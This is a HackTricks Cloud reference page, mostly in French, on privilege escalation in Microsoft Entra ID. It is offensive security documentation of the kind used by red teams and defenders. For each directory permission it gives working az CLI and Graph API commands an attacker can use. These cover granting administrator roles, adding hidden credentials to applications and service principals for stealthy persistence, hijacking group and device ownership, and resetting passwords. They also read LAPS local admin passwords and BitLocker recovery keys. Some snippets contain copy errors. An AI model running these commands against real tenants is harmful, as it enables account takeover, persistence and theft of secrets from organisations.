# Az - EntraID Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="info" %}
Notez que **tous les droits granulaires** des r√¥les int√©gr√©s dans Entra ID **ne sont pas √©ligibles pour √™tre utilis√©s dans des r√¥les personnalis√©s.**
{% endhint %}

## R√¥les

### R√¥le : Administrateur de r√¥le privil√©gi√© <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Ce r√¥le contient les permissions granulaires n√©cessaires pour pouvoir attribuer des r√¥les √† des principaux et pour donner plus de permissions aux r√¥les. Les deux actions pourraient √™tre abus√©es pour escalader les privil√®ges.

* Attribuer un r√¥le √† un utilisateur :
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* Ajouter plus de permissions √† un r√¥le :
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Applications

### `microsoft.directory/applications/credentials/update`

Cela permet √† un attaquant d'**ajouter des identifiants** (mots de passe ou certificats) √† des applications existantes. Si l'application a des autorisations privil√©gi√©es, l'attaquant peut s'authentifier en tant que cette application et obtenir ces privil√®ges.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

Cela permet les m√™mes actions que `applications/credentials/update`, mais limit√©es aux applications √† r√©pertoire unique.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**Description**: Mettre √† jour les propri√©taires des applications\
**Abuse Potential**: En s'ajoutant en tant que propri√©taire, un attaquant peut manipuler l'application, y compris les identifiants et les autorisations.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

Cela permet √† un attaquant d'ajouter des identifiants √† des service principals existants. Si le service principal a des privil√®ges √©lev√©s, l'attaquant peut assumer ces privil√®ges.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
Le nouveau mot de passe g√©n√©r√© n'appara√Ætra pas dans la console web, donc cela pourrait √™tre un moyen furtif de maintenir la persistance sur un principal de service.\
Depuis l'API, ils peuvent √™tre trouv√©s avec : `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

Si vous obtenez l'erreur `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."`, c'est parce que **il n'est pas possible de modifier la propri√©t√© passwordCredentials** du SP et vous devez d'abord le d√©verrouiller. Pour cela, vous avez besoin d'une autorisation (`microsoft.directory/applications/allProperties/update`) qui vous permet d'ex√©cuter :

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

Cela permet √† un attaquant d'ajouter des identifiants √† des principaux de service existants. Si le principal de service a des privil√®ges √©lev√©s, l'attaquant peut assumer ces privil√®ges.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

Semblable aux applications, cette autorisation permet d'ajouter d'autres propri√©taires √† un principal de service. Poss√©der un principal de service permet de contr√¥ler ses identifiants et ses autorisations.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Apr√®s avoir ajout√© un nouveau propri√©taire, j'ai essay√© de le supprimer mais l'API a r√©pondu que la m√©thode DELETE n'√©tait pas support√©e, m√™me si c'est la m√©thode que vous devez utiliser pour supprimer le propri√©taire. Donc, vous **ne pouvez pas supprimer les propri√©taires de nos jours**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` et `enable`

Ces permissions permettent de d√©sactiver et d'activer des principaux de service. Un attaquant pourrait utiliser cette permission pour activer un principal de service auquel il pourrait acc√©der d'une mani√®re ou d'une autre pour escalader ses privil√®ges.

Notez que pour cette technique, l'attaquant aura besoin de plus de permissions afin de prendre le contr√¥le du principal de service activ√©.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Ces autorisations permettent de cr√©er et d'obtenir des identifiants pour le single sign-on, ce qui pourrait permettre l'acc√®s √† des applications tierces.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## Groupes

### `microsoft.directory/groups/allProperties/update`

Cette autorisation permet d'ajouter des utilisateurs √† des groupes privil√©gi√©s, ce qui entra√Æne une √©l√©vation de privil√®ges.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Remarque**: Cette autorisation exclut les groupes assignables de r√¥le Entra ID.

### `microsoft.directory/groups/owners/update`

Cette autorisation permet de devenir propri√©taire de groupes. Un propri√©taire de groupe peut contr√¥ler l'appartenance et les param√®tres du groupe, ce qui peut potentiellement entra√Æner une √©l√©vation des privil√®ges au sein du groupe.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Remarque**: Cette autorisation exclut les groupes assignables de r√¥le Entra ID.

### `microsoft.directory/groups/members/update`

Cette autorisation permet d'ajouter des membres √† un groupe. Un attaquant pourrait s'ajouter ou ajouter des comptes malveillants √† des groupes privil√©gi√©s, ce qui peut accorder un acc√®s √©lev√©.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

Cette autorisation permet de mettre √† jour la r√®gle d'appartenance dans un groupe dynamique. Un attaquant pourrait modifier les r√®gles dynamiques pour s'inclure dans des groupes privil√©gi√©s sans ajout explicite.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Note**: Cette permission exclut les groupes assignables de r√¥le Entra ID.

### Privesc des Groupes Dynamiques

Il pourrait √™tre possible pour les utilisateurs d'escalader des privil√®ges en modifiant leurs propres propri√©t√©s pour √™tre ajout√©s en tant que membres de groupes dynamiques. Pour plus d'infos, consultez :

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## Utilisateurs

### `microsoft.directory/users/password/update`

Cette permission permet de r√©initialiser le mot de passe des utilisateurs non administrateurs, permettant √† un attaquant potentiel d'escalader des privil√®ges vers d'autres utilisateurs. Cette permission ne peut pas √™tre assign√©e √† des r√¥les personnalis√©s.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

Ce privil√®ge permet de modifier les propri√©t√©s de l'utilisateur. Il est courant de trouver des groupes dynamiques qui ajoutent des utilisateurs en fonction des valeurs des propri√©t√©s, par cons√©quent, cette autorisation pourrait permettre √† un utilisateur de d√©finir la valeur de propri√©t√© n√©cessaire pour √™tre membre d'un groupe dynamique sp√©cifique et d'escalader les privil√®ges.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## Politiques d'acc√®s conditionnel et contournement de MFA

Des politiques d'acc√®s conditionnel mal configur√©es n√©cessitant MFA pourraient √™tre contourn√©es, v√©rifiez :

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## Appareils

### `microsoft.directory/devices/registeredOwners/update`

Cette autorisation permet aux attaquants de se d√©signer comme propri√©taires d'appareils pour obtenir le contr√¥le ou l'acc√®s aux param√®tres et donn√©es sp√©cifiques √† l'appareil.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

Cette autorisation permet aux attaquants d'associer leur compte √† des appareils pour obtenir un acc√®s ou contourner les politiques de s√©curit√©.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

Cette autorisation permet aux attaquants de lire les propri√©t√©s des informations d'identification du compte administrateur local sauvegard√© pour les appareils joints √† Microsoft Entra, y compris le mot de passe. 

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

Cette autorisation permet d'acc√©der aux cl√©s BitLocker, ce qui pourrait permettre √† un attaquant de d√©chiffrer des disques, compromettant ainsi la confidentialit√© des donn√©es.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## Autres autorisations int√©ressantes (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
